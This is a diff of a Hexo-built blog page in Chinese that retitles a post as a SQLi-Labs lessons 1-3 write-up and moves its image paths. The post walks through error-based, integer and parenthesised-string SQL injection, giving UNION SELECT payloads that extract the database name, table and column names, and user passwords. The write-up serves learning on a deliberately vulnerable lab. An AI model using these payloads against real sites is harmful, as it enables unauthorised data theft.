@@ -2,18 +2,21 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>2019-09-01-第一天使用GitHub IO | N00000000B&#39;s Document Blog</title>
+  <title>2019-09-01-Sqli-Lab1-3 | N00000000B&#39;s Document Blog</title>
   <meta name="keywords" content=" Web安全 , SQLI-Lab ">
-  <meta name="description" content="2019-09-01-第一天使用GitHub IO | N00000000B&#39;s Document Blog">
+  <meta name="description" content="2019-09-01-Sqli-Lab1-3 | N00000000B&#39;s Document Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="主要的分类为 1   2   3">
 <meta property="og:type" content="website">
-<meta property="og:title" content="标签">
-<meta property="og:url" content="https://skywalker1997.github.io/tags/index.html">
+<meta property="og:title" content="分类">
+<meta property="og:url" content="https://skywalker1997.github.io/categories/index.html">
 <meta property="og:site_name" content="N00000000B&#39;s Document Blog">
+<meta property="og:description" content="主要的分类为 1   2   3">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-09-09T05:03:23.407Z">
+<meta property="og:updated_time" content="2019-09-10T09:24:05.163Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="标签">
+<meta name="twitter:title" content="分类">
+<meta name="twitter:description" content="主要的分类为 1   2   3">
 
 
 <link rel="icon" href="/img/PINKFLOYD.jpeg">
@@ -235,7 +238,7 @@
            href="/information-security/2019-09-15-Sqli-Lab1-3"
            data-tag="Web安全,SQLI-Lab"
            data-author="" >
-            <span class="post-title" title="2019-09-01-第一天使用GitHub IO">2019-09-01-第一天使用GitHub IO</span>
+            <span class="post-title" title="2019-09-01-Sqli-Lab1-3">2019-09-01-Sqli-Lab1-3</span>
             <span class="post-date" title="2019-09-01 19:43:13">2019/09/01</span>
         </a>
         
@@ -261,7 +264,7 @@
     <div class="pjax">
         <article id="post-2019-09-15-Sqli-Lab1-3" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">2019-09-01-第一天使用GitHub IO</h1>
+        <h1 class="article-title">2019-09-01-Sqli-Lab1-3</h1>
     
     <div class="article-meta">
         
@@ -285,7 +288,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-09-15 22:24:25'>2019-09-01 19:43</time>
+        创建时间:<time class="date" title='更新时间: 2019-09-15 22:38:51'>2019-09-01 19:43</time>
         
     </div>
     <div class="article-meta">
@@ -326,37 +329,37 @@
       
         <h1 id="Sqli——Lab总结1-3"><a href="#Sqli——Lab总结1-3" class="headerlink" title="Sqli——Lab总结1-3"></a>Sqli——Lab总结1-3</h1><h2 id="1-基于报错的注入，单引号"><a href="#1-基于报错的注入，单引号" class="headerlink" title="1.基于报错的注入，单引号"></a>1.基于报错的注入，单引号</h2><p>基于报错的注入主要针对的是因为前端输入存在错误导致网页上报出相应错误的情况  </p>
 <blockquote>
-<p>输入的payload为：id=1<br><img src="../images/sqli_lab_less1-1.png" alt="正常输入信息">  </p>
+<p>输入的payload为：id=1<br><img src="../images/sqli-lab/sqli_lab_less1-1.png" alt="正常输入信息">  </p>
 </blockquote>
 <p>根据正常输入在网页上的显示有两个输出，一个是username，一个是password  </p>
 <p>而根据进行异常输入，发现网页输出报错</p>
 <blockquote>
-<p>输入的payload为：id=1’<br><img src="../images/sqli_lab_less1-2.png" alt="报错信息">  </p>
+<p>输入的payload为：id=1’<br><img src="../images/sqli-lab/sqli_lab_less1-2.png" alt="报错信息">  </p>
 </blockquote>
 <p>猜测构造的sql语句为：<br>select  from database_name where id=’ 1’ ‘ LIMIT 0,1<br>所以需要根据以上语句构造相关的payload</p>
 <blockquote>
-<p>构造payload为： id=-1’ union select 1,2,database()  –+<br><img src="../images/sqli_lab_less1-3.png" alt="前端信息"></p>
+<p>构造payload为： id=-1’ union select 1,2,database()  –+<br><img src="../images/sqli-lab/sqli_lab_less1-3.png" alt="前端信息"></p>
 </blockquote>
 <p>获取相应的数据库名’security’</p>
 <blockquote>
-<p>构造payload为：id=-1’ union select 1, 2, group_concat(table_name) from information_schema .tables where table_schema=”security” –+<br><img src="../images/sqli_lab_less1-4.png" alt="前端信息">  </p>
+<p>构造payload为：id=-1’ union select 1, 2, group_concat(table_name) from information_schema .tables where table_schema=”security” –+<br><img src="../images/sqli-lab/sqli_lab_less1-4.png" alt="前端信息">  </p>
 </blockquote>
 <p>group_concat得到了所有表名，敏感表名为users</p>
 <blockquote>
-<p>构造payload为：id=-1’ union select 1, 2, group_concat(0x24,column_name) from information_schema.columns  where table_name = ‘users’ –+<br><img src="../images/sqli_lab_less1-5.png" alt="前端信息">  </p>
+<p>构造payload为：id=-1’ union select 1, 2, group_concat(0x24,column_name) from information_schema.columns  where table_name = ‘users’ –+<br><img src="../images/sqli-lab/sqli_lab_less1-5.png" alt="前端信息">  </p>
 </blockquote>
 <p>得到相应的列名,取得敏感列id和password</p>
 <blockquote>
-<p>构造payload 为： id=-1’ union select 1, 2, group_concat(0x23,id,password) from users  –+<br><img src="../images/sqli_lab_less1-6.png" alt="前端信息"></p>
+<p>构造payload 为： id=-1’ union select 1, 2, group_concat(0x23,id,password) from users  –+<br><img src="../images/sqli-lab/sqli_lab_less1-6.png" alt="前端信息"></p>
 </blockquote>
 <h2 id="2-基于整形的注入"><a href="#2-基于整形的注入" class="headerlink" title="2.基于整形的注入"></a>2.基于整形的注入</h2><p>与上题几乎一致，只是在后台sql语句上，id=后有变化</p>
 <blockquote>
-<p>尝试构造payload为：id=1’<br><img src="../images/sqli_lab_less2-1.png" alt="报错信息">  </p>
+<p>尝试构造payload为：id=1’<br><img src="../images/sqli-lab/sqli_lab_less2-1.png" alt="报错信息">  </p>
 </blockquote>
 <p>发现报错信息为 ‘ – LIMIT 0,1</p>
 <p>猜测sql语句为<br>select from database_name where id=1’ LIMIT 0,1<br>和上题的id=’内容’ 相比，本题为id=内容，因此为基于错误的整形注入。<br>在构造sql语句的时候不需要进行’的匹配逃逸</p>
 <blockquote>
-<p>构造payload为：id=-1 union select 1,2,database() –+<br><img src="../images/sqli_lab_less2-2.png" alt="前端显示"></p>
+<p>构造payload为：id=-1 union select 1,2,database() –+<br><img src="../images/sqli-lab/sqli_lab_less2-2.png" alt="前端显示"></p>
 </blockquote>
 <p>得到数据库名称security</p>
 <p>依照上题的相关步骤，构造以下的payload分别得到表名，列名和最后的敏感内容</p>
@@ -370,7 +373,7 @@
 <p>数据payload为：id=-1 union select 1,2,group_concat(username,0x23,password) from users –+</p>
 </blockquote>
 <h2 id="3-基于错误的GET单引号变形字符型注入"><a href="#3-基于错误的GET单引号变形字符型注入" class="headerlink" title="3.基于错误的GET单引号变形字符型注入"></a>3.基于错误的GET单引号变形字符型注入</h2><blockquote>
-<p>尝试构造 payload 为：id=1’<br><img src="../images/sqli_lab_less3-1.png" alt="报错信息">    </p>
+<p>尝试构造 payload 为：id=1’<br><img src="../images/sqli-lab/sqli_lab_less3-1.png" alt="报错信息">    </p>
 </blockquote>
 <p>报错为’1’’) LIMIT 0,1<br>猜测sql语句为 select username，password from table_name where id=(‘’) LIM<br>IT 0,1</p>
 <p>按照前两题的构造逻辑，只需要逃逸单引号和闭合左括号可以直接获取数据库名，表名，列名和相关数据。</p>
@@ -390,12 +393,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>2019-09-01-第一天使用GitHub IO</p>
+    <p><span class="copy-title">文章标题:</span>2019-09-01-Sqli-Lab1-3</p>
     <p><span class="copy-title">文章字数:</span><span class="post-count">570</span></p>
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="N00000000B">N00000000B</a></p>
     <p><span class="copy-title">发布时间:</span>2019-09-01, 19:43:13</p>
-    <p><span class="copy-title">最后更新:</span>2019-09-15, 22:24:25</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/information-security/2019-09-15-Sqli-Lab1-3" title="2019-09-01-第一天使用GitHub IO">https://skywalker1997.github.io/information-security/2019-09-15-Sqli-Lab1-3</a>
+    <p><span class="copy-title">最后更新:</span>2019-09-15, 22:38:51</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/information-security/2019-09-15-Sqli-Lab1-3" title="2019-09-01-Sqli-Lab1-3">https://skywalker1997.github.io/information-security/2019-09-15-Sqli-Lab1-3</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
